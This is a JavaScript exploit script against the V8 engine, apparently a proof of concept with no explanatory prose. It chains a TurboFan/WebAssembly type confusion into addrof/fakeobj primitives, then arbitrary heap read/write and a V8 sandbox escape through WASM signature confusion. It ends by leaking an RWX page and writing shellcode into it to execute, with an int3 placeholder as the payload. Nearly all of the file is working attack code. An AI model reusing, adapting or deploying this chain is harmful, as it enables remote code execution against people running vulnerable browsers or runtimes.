const log = console.log;

const SHELLCODE = [ 0xcc ]; //int3

/// ########## Utility functions ##########

let conv_buf = new ArrayBuffer(8);
let conv_doubles = new Float64Array(conv_buf);
let conv_int32s = new Uint32Array(conv_buf);
let conv_int64s = new BigUint64Array(conv_buf);

function f2il(v) {
    conv_doubles[0] = v;
    return conv_int32s[0];
}

function f2ih(v) {
    conv_doubles[0] = v;
    return conv_int32s[1];
}

function f2bi(v) {
    conv_doubles[0] = v;
    return conv_int64s[0];
}

function i2f(l, h) {
    conv_int32s[0] = l;
    conv_int32s[1] = h; 
    return conv_doubles[0];
}

function bi2f(v) {
    conv_int64s[0] = v; 
    return conv_doubles[0];
}


function flush_young_gen() {
    let outer = [ [], [], [], [], [] ];
    for(let i = 0; i < outer.length; i++) outer[i].length = 0x100000;
    for(let i = 0; i < outer.length; i++) outer[i].fill(13.37);
    return outer;
}

function optimize_turbofan(func, ...args) {
    function optimize_inner(func, args) {
        //Call the function a bunch of times to trigger optimizations
        for(let i = 0; i < 10000; i++) {
            optimize_turbofan.call_if_not_warmup = new Function(`return ${i};`);

            //Prevent the callsite from being optimized, otherwise inlining / OSR will mess things up
            new Function("func", "args", "for(let i = 0; i < 10; i++) func(...args);")(func, args);
        }
    }

    //Prevent optimize_inner from being optimized / gathering feedback info
    new Function("func", "args", optimize_inner.toString() + "\nreturn optimize_inner(func, args);")(func, args);
    
    optimize_turbofan.call_if_not_warmup = new Function("cb", "return cb();");
}
optimize_turbofan.call_if_not_warmup = cb => cb();

/// ########## Obtain heap addressof/fakeobj primitives ##########

//Setup the WASM module
let wasm_callback;

let wasm_mod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,11,1,2,106,115,4,106,115,99,98,0,0,3,2,1,0,7,8,1,4,115,116,117,98,0,1,10,6,1,4,0,16,0,11]))
let wasm_inst = new WebAssembly.Instance(wasm_mod, {
    "js": { jscb: () => wasm_callback?.() }
});

let wasm_promise_stub = () => WebAssembly.promising(wasm_inst.exports.stub)();

//Actual vuln primitives
function prep_addrof(fork_cnt) {
    const pwn_arr = [ 12.34 ];
    pwn_arr[`fork_map_addroff_${fork_cnt}`] = 1337;

    function pwn() {
        optimize_turbofan.call_if_not_warmup(wasm_promise_stub);
        return pwn_arr[0];
    }
    optimize_turbofan(pwn);

    return obj => {
        wasm_callback = () => pwn_arr[0] = obj;
        let leak = pwn();
        delete wasm_callback;

        if(leak == obj) throw new Error("failed to leak object address");
        return f2il(leak);
    };
}

function prep_fakeobj(fork_cnt) {
    const pwn_arr = [ 12.34, 56.78 ];
    pwn_arr[`fork_map_fakeobj_${fork_cnt}`] = 1337;

    let pwn_val = 13.37;

    function pwn() {
        optimize_turbofan.call_if_not_warmup(wasm_promise_stub);
        pwn_arr[0] = pwn_val;
    }
    optimize_turbofan(pwn);

    return addr => {
        pwn_val = i2f(addr, 0);
        wasm_callback = () => pwn_arr[1] = {};
        pwn();
        delete wasm_callback;

        // - no check to not throw on invalid object types
        // if(pwn_arr[0] == fake_ptr) throw new Error("failed to obtain fake object handle");
        return pwn_arr[0];
    };
}

// - isolate each call of the primitives
function _isolate(func) {
    let counter = 0;
    return (...args) => {
        let ret;
        eval(`let func = ${func}; ret = func(...args, counter++);`);
        return ret;
    };
}

var addrof = obj => addrof.prepare()(obj);
addrof.prepare = _isolate(prep_addrof);

var fakeobj = addr => fakeobj.prepapre()(addr);
fakeobj.prepare = _isolate(prep_fakeobj);


//The primitives still fail after like 3-4x calls, even with the above isolation
//Either way, this is enough to bootstrap proper primitives

log("prepared addrof/fakeobj primitives");

/// ########## Obtain heap read/write primitives ##########

log("obtaining heap RW primitives...");

//Allocate a pwn and victim array for later
let pwn_arr = [ 13.37, 13.37, 13.37, 13.37 ];
let victim_arr = [ 13.37, 13.37, 13.37, 13.37 ];
flush_young_gen();

let addr_victim = addrof(victim_arr);
log(`victim array addr: 0x${addr_victim.toString(16)}`);

//Optimize a few helper function
function is_bigint(obj) {
    // - optimizes down to a map load + compare, without any risks of explosions for invalid maps
    return typeof obj === "bigint";
}
optimize_turbofan(is_bigint, {});

function opt_arr_write(arr, val) {
    arr[0] = val;
}
optimize_turbofan(opt_arr_write, [12.34], 13.37, [12.34], 13.37);

//Prepare later addrof/fakeobj calls ahead-of-time
//This way they liter as little garbage as possible
let prepped_addrof = addrof.prepare?.() ?? addrof;
let prepped_fakeobj = fakeobj.prepare?.() ?? fakeobj;

//Wipe the young generation, then allocate the holder
flush_young_gen();
let holder = [ 13.37, 13.37 ];

//Allocate a marked reference to the pwn array, to find later
const PWN_REF_SENTINEL = 13374242;
let pwn_ref = [ PWN_REF_SENTINEL, pwn_arr ];

//Calculate various addresses for later
//We can do this because heap layout of the young generation is consistent
let addr_holder = prepped_addrof(holder);
let addr_holder_elems = addr_holder - 0x18;
log(`holder array addr: 0x${addr_holder.toString(16)} (elems addr: 0x${addr_holder_elems.toString(16)})`);

let addr_pwn_ref_elems = addr_holder + 0x10;

//Obtain a fake object handle pointing to the holder's elements 
let addr_fake_obj = addr_holder_elems + 8;
let fake_obj = prepped_fakeobj(addr_fake_obj);

//Turn the fake object into a bigint
let kBigIntMap = 1;
while(true) {
    holder[0] = i2f(kBigIntMap, 0x100);
    if(is_bigint(fake_obj)) break;
    kBigIntMap += 4;
    if(kBigIntMap > 0x1000) throw new Error("couldn't find kBigIntMap");
}

log(`kBigIntMap: 0x${kBigIntMap.toString(16)}`);

//Extract the address of the pwn array from the fake bigint
let pwn_ref_sentinel = Number((fake_obj >> BigInt((addr_pwn_ref_elems+0x8 - (addr_fake_obj + 8))*8)) & 0xffffffffn);
let addr_pwn_arr = Number((fake_obj >> BigInt((addr_pwn_ref_elems+0xc - (addr_fake_obj + 8))*8)) & 0xffffffffn);

if(pwn_ref_sentinel != PWN_REF_SENTINEL<<1) throw new Error(`invalid pwn_ref sentinel: ${pwn_ref_sentinel}`);
log(`pwn array addr: 0x${addr_pwn_arr.toString(16)}`);

//Turn the fake object into a fake PACKED_DOUBLE_ELEMENTS array, and use it to overwrite the pwn array's elements pointer
//Do this by copying the header from the holder array
let packed_doubles_arr_header = (fake_obj >> BigInt((addr_holder - (addr_fake_obj + 8))*8)) & 0xffffffffffffffffn;

holder[0] = bi2f(packed_doubles_arr_header);
holder[1] = i2f(addr_holder_elems, 1337 << 1);
holder[1] = i2f(addr_pwn_arr, 1 << 1);
opt_arr_write(fake_obj, i2f(addr_victim - 8, 2 << 1));

// - prevent GC explosions from here on
fake_obj = null;
delete fake_obj;

log("overwrote pwn array elements pointer using a fake PACKED_DOUBLE_ELEMENTS array");

//Bootstrap initial R/W primitives
function hread32(addr) {
    pwn_arr[1] = i2f((addr - 8 - 4) | 1, 1 << 1);
    return f2ih(victim_arr[0]);
}
function hwrite32(addr, val) {
    pwn_arr[1] = i2f((addr - 8) | 1, 1 << 1);
    victim_arr[0] = i2f(val, f2ih(victim_arr[0]));
}

// - optimize them to improve reliability
let _pwn_arr = pwn_arr, _victim_arr = victim_arr;
pwn_arr = [13.37, 13.37];
victim_arr = [13.37, 13.37];
optimize_turbofan(hread32, 1234);
optimize_turbofan(hwrite32, 1234, 5678);
pwn_arr = _pwn_arr;
victim_arr = _victim_arr;

log("success!");

/// ########## Bootstrap stage 2 primitives ##########

log("bootstrapping stage 2 primitives...");

//Bootstrap proper addrof / fakeobj primitives using an object holder
let obj_holder = [ {} ];
flush_young_gen();

let addr_obj_holder = addrof(obj_holder);
log(`object holder addr: 0x${addr_obj_holder.toString(16)}`);

let addr_obj_holder_elems = hread32(addr_obj_holder + 0x8);
log(`object holder elements addr: 0x${addr_obj_holder_elems.toString(16)}`);

addrof = (obj) => {
    obj_holder[0] = obj;
    return hread32(addr_obj_holder_elems + 8);
};

fakeobj = (addr) => {
    hwrite32(addr_obj_holder_elems + 8, addr);
    var obj = obj_holder[0];
    obj_holder[0] = {}; //defuse any potential GCs
    return obj;
};

//Bootstrap proper heap R/W primitives using an ArrayBuffer
let sbox_buf = new ArrayBuffer(0x1337);

function hack_sbox() {
    //Has to inside a function to trick V8 into not optimizing (yet)
    let sbox_buf_addr = addrof(sbox_buf);

    hwrite32(sbox_buf_addr + 0x14, 0xe0000000);
    hwrite32(sbox_buf_addr + 0x18, 0xffffffff);

    hwrite32(sbox_buf_addr + 0x1c, 0xe0000000);
    hwrite32(sbox_buf_addr + 0x20, 0xffffffff);

    hwrite32(sbox_buf_addr + 0x24, 0x00000000);
    hwrite32(sbox_buf_addr + 0x28, 0x00000000);
}
hack_sbox();

let sbox_view = new DataView(sbox_buf);
hread32 = (addr) => sbox_view.getUint32(addr & ~1, true);
hwrite32 = (addr, val) => sbox_view.setUint32(addr & ~1, val, true);

log("success!");

/// ########## Sandbox escape ##########

//Determine the offset of the shared_function_info pointer
//Recent V8 versions removed the trusted code pointer, so it might vary slightly
//Do this by creating two JSFunctions in the same context, and finding the identical field
//The field before it will be the `shared_function_info` pointer
function determine_jsfunction_sfi_offset() {
    let funcA = () => 12.34; 
    let funcB = () => 56.78;

    let addr_funcA = addrof(funcA), addr_funcB = addrof(funcB);
    for(let off = 0x10 + 4; off < 0x20; off++) {
        if(hread32(addr_funcA + off) == hread32(addr_funcB + off)) return off - 4;
    }
    throw new Error("failed to determine JSFunction shared_function_info pointer offset");
}

const JSFunction_SFI_OFF = determine_jsfunction_sfi_offset();
log(`JSFunction shared_function_info offset: 0x${JSFunction_SFI_OFF.toString(16)}`);

//Set up the type confusion WASM module
let pwn_wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,37,7,95,1,126,1,96,1,126,1,126,96,0,1,100,0,96,1,111,1,126,96,1,100,0,1,126,96,2,126,126,0,96,2,100,0,126,0,3,8,7,2,3,1,1,4,5,6,7,101,7,18,115,116,114,117,99,116,95,112,108,97,99,101,104,111,108,100,101,114,0,0,7,114,101,102,50,105,110,116,0,1,14,114,101,102,50,105,110,116,95,112,119,110,115,105,103,0,2,6,114,101,97,100,54,52,0,3,13,114,101,97,100,54,52,95,112,119,110,115,105,103,0,4,7,119,114,105,116,101,54,52,0,5,14,119,114,105,116,101,54,52,95,112,119,110,115,105,103,0,6,10,68,7,15,0,66,239,155,175,205,248,172,209,145,1,251,0,0,11,6,1,1,126,66,42,11,6,1,1,126,32,0,11,6,1,1,126,66,42,11,10,1,1,126,32,0,251,2,0,0,11,5,1,1,126,1,11,12,1,1,126,32,0,32,1,251,5,0,0,11])
let pwn_wasm_module = new WebAssembly.Module(pwn_wasm_code);
let pwn_wasm_inst = new WebAssembly.Instance(pwn_wasm_module);

let wasm_struct_placeholder = pwn_wasm_inst.exports.struct_placeholder();

function replace_wasm_code(victimFunc, pwnFunc, args) {
    log(`replaceWasmCode: func@${victimFunc.name} <- func@${pwnFunc.name}`);

    //Ensure the JS2WASM stub is purpose-compiled 
    for(let i = 0; i < 100000; i++) victimFunc(...args);

    //Overwrite the signature
    let victimSFI = hread32(addrof(victimFunc) + JSFunction_SFI_OFF);
    log(` - victimFunc SharedFunctionInfo: 0x${victimSFI.toString(16)}`);

    let victimTFD = hread32(victimSFI + 4);
    log(` - victimFunc trusted_function_data: 0x${victimTFD.toString(16)}`);

    let pwnSFI = hread32(addrof(pwnFunc) + JSFunction_SFI_OFF);
    log(` - pwnFunc SharedFunctionInfo: 0x${pwnSFI.toString(16)}`);

    let pwnTFD = hread32(pwnSFI + 4);
    log(` - pwnFunc trusted_function_data: 0x${pwnTFD.toString(16)}`);

    hwrite32(victimSFI + 4, pwnTFD);
}

// - setup ref2int stub & leak sandbox base address
let ref2int = pwn_wasm_inst.exports.ref2int;
replace_wasm_code(ref2int, pwn_wasm_inst.exports.ref2int_pwnsig, [{}]);

var SANDBOX_BASE = ref2int(ref2int) - BigInt(addrof(ref2int));
log(`sandbox base: 0x${SANDBOX_BASE.toString(16)}`);
if((SANDBOX_BASE & 0xffffffn) != 0) throw new Error("Invalid sandbox base leak");

// - setup read64 / write64; ensure that the struct variants are optimized, then replace code
log("optimizing read64/write64 primitives...");
for(let i = 0; i < 500000; i++) pwn_wasm_inst.exports.read64_pwnsig(wasm_struct_placeholder);
for(let i = 0; i < 500000; i++) pwn_wasm_inst.exports.write64_pwnsig(wasm_struct_placeholder, 0n);

replace_wasm_code(pwn_wasm_inst.exports.read64, pwn_wasm_inst.exports.read64_pwnsig, [0n]);
replace_wasm_code(pwn_wasm_inst.exports.write64, pwn_wasm_inst.exports.write64_pwnsig, [0n, 0n]);

function read64(addr) {
    return pwn_wasm_inst.exports.read64(addr - 7n);
}
function write64(addr, val) {
    //Reference arguments come last in the ABI
    pwn_wasm_inst.exports.write64(val, addr - 7n);
}

function exec_shellcode(shellcode) {
    log("preparing for shellcode execution...");
    
    //Prepare the stub / stack leak module
    let stub_warmup = true;

    let wasm_stub_code = new Uint8Array([0,97,115,109,1,0,0,0,1,96,4,96,64,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,1,111,96,0,0,96,16,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,1,126,96,0,1,111,2,27,2,2,106,115,7,115,116,117,98,95,99,98,0,1,2,106,115,7,108,101,97,107,95,99,98,0,0,3,4,3,2,3,0,7,41,3,4,115,116,117,98,0,2,10,115,116,97,99,107,95,108,101,97,107,0,3,17,115,116,97,99,107,95,108,101,97,107,95,112,119,110,115,105,103,0,4,10,152,1,3,7,0,16,0,66,185,10,11,6,1,1,126,208,111,11,134,1,1,1,126,32,0,32,1,32,2,32,3,32,4,32,5,32,6,32,7,32,8,32,9,32,10,32,11,32,12,32,13,32,14,32,15,32,16,32,17,32,18,32,19,32,20,32,21,32,22,32,23,32,24,32,25,32,26,32,27,32,28,32,29,32,30,32,31,32,32,32,33,32,34,32,35,32,36,32,37,32,38,32,39,32,40,32,41,32,42,32,43,32,44,32,45,32,46,32,47,32,48,32,49,32,50,32,51,32,52,32,53,32,54,32,55,32,56,32,57,32,58,32,59,32,60,32,61,32,62,32,63,16,1,11])
    let wasm_stub_module = new WebAssembly.Module(wasm_stub_code);
    let wasm_stub_inst = new WebAssembly.Instance(wasm_stub_module, {
        "js": {
            "stub_cb": stub_cb,
            "leak_cb": (...leak) => leak
        }
    });

    // - optimize the victim stub, so that its JS2WASM stub will be in an RWX page
    log("optimizing victim stub...");

    const STUB_MARKER_ARG = 0x1337133713371337n;
    let stub_args = new Array(16).fill(STUB_MARKER_ARG);
    for(let i = 0; i < 500000; i++) wasm_stub_inst.exports.stub(...stub_args);

    // - confuse signatures
    replace_wasm_code(wasm_stub_inst.exports.stack_leak, wasm_stub_inst.exports.stack_leak_pwnsig, []);

    // - leak the stub return pointer, which points to the JS2WASM stub, leaking an RWX page
    let rwx_addr;
    function stub_cb() {
        if(stub_warmup) return;

        //Leak values from the stack
        let stack_leaks = wasm_stub_inst.exports.stack_leak();
        
        //Look for the stub's JS2WASM argument buffer by searching for the marker argument
        let args_buf_idx = -1;
        for(let i = 1; i < stack_leaks.length; i++) {
            if(stack_leaks[i] == STUB_MARKER_ARG) {
                args_buf_idx = i;
                break;
            }
        }
        if(args_buf_idx < 0) throw new Error("failed to find stub JS2WASM argument buffer in stack leak");

        log(`stub JS2WASM args buffer leak index: ${args_buf_idx}`);

        //The value pushed right afterwards (so preceeding in memory) is the return address back into the JS2WASM stub
        rwx_addr = stack_leaks[args_buf_idx-1];
    }

    stub_warmup = false;
    wasm_stub_inst.exports.stub(...stub_args);
    stub_warmup = true;

    log(`RWX addr: 0x${rwx_addr.toString(16)}`);

    // - write shellcode, then execute :)
    while(shellcode.length % 8 != 0) shellcode.push(0xcc);

    let shellcode_view = new DataView(new Uint8Array(shellcode).buffer)
    for(let i = 0; i < shellcode.length; i += 8) write64(rwx_addr + BigInt(i), shellcode_view.getBigUint64(i, true));

    log("executing shellcode...");
    wasm_stub_inst.exports.stub(...stub_args);
    log(" - returned successfully");
}

/// ########## Execute shellcode ##########

exec_shellcode(SHELLCODE);